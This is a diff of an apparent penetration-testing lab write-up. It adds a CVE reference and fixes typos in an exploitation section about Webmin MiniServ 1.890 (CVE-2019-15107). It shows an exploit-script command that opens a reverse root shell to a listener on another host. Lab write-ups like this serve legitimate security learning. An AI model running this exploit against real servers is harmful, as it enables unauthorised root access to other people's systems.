@@ -51,13 +51,17 @@ The website was subjcted to directory bruteforcing using  ffuf -w /usr/share/wor
 # Exploitation
 
 From the Enumeratin, it was discovered that the webserver on port 10000 of the  10.200.73.200 Host is running  MiniServ 1.890 (Webmin httpd)
-A closer look at this version showed that it is vulnerable to RCE that gives a root shell
+A closer look at this version showed that it is vulnerable to RCE that gives a root shell CVE-2019–15107 
 ![image](https://github.com/user-attachments/assets/b454cbaf-d8cd-470c-8066-516afbdf71b8)
 
 Using a publicly available python script and setting up a listner on port 2294, the RCE vulnerablity was exploited
 ./exploit.py  10.200.73.200 10000   10.50.66.4 2294           
 screnshot of the script:
 ![image](https://github.com/user-attachments/assets/d845e147-f37a-42b0-9363-9b7067507d0d)
-screensot of the listener getting root shell
+Screenshot of the listener getting root shell
 ![image](https://github.com/user-attachments/assets/07b17aab-1e5a-4daf-b85e-a084bffcf05e)
+
+
+
+
 
